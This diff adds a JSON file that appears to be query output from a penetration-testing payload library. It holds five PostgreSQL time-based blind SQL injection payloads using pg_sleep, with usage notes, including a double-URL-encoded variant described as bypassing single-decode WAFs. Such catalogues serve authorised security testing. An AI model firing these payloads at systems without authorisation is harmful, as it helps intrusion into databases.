@@ -1,0 +1,108 @@
+{
+  "query": {
+    "limit": 5,
+    "max_risk": 3,
+    "tag": "pg_sleep",
+    "vuln_type": "sqli"
+  },
+  "count": 5,
+  "results": [
+    {
+      "id": "080ed7f2aea33387",
+      "payload": "\" AND (SELECT pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "string_boundary": "double_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Double-quote context time-based blind. Use when injection is inside a PG identifier (table/column alias).",
+      "source": "ensphere",
+      "tags": [
+        "double_quote",
+        "pg_sleep"
+      ]
+    },
+    {
+      "id": "2ae5435acd7b190f",
+      "payload": "' AND (SELECT pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Basic time-based blind. Inject in string context. Observe response delay vs baseline.",
+      "source": "ensphere",
+      "tags": [
+        "confirmation",
+        "pg_sleep"
+      ]
+    },
+    {
+      "id": "2f0f4ac820672691",
+      "payload": "%2527%2520AND%2520(SELECT%2520pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "query",
+      "encoding": "double_url",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Double URL-encoded time-based blind. Bypasses WAFs that only single-decode before inspection.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "double_url_encoded",
+        "pg_sleep"
+      ]
+    },
+    {
+      "id": "3aebb2d1c22b02b9",
+      "payload": "' AND (SELECT pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "xml_body",
+      "encoding": "raw",
+      "string_boundary": "single_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Time-based blind via XML body. For SOAP/XML-RPC endpoints that parse XML element values into SQL.",
+      "source": "ensphere",
+      "tags": [
+        "pg_sleep",
+        "xml_body"
+      ]
+    },
+    {
+      "id": "4965c17aaaeffd9e",
+      "payload": "\" AND (SELECT pg_sleep(SLEEP_SECONDS))--",
+      "technique": "blind_time",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "string_boundary": "double_quote",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "SLEEP_SECONDS"
+      ],
+      "notes": "Double-quote blind_time in JSON body context. For APIs that interpolate JSON values into identifier positions.",
+      "source": "ensphere",
+      "tags": [
+        "double_quote",
+        "json",
+        "pg_sleep"
+      ]
+    }
+  ]
+}
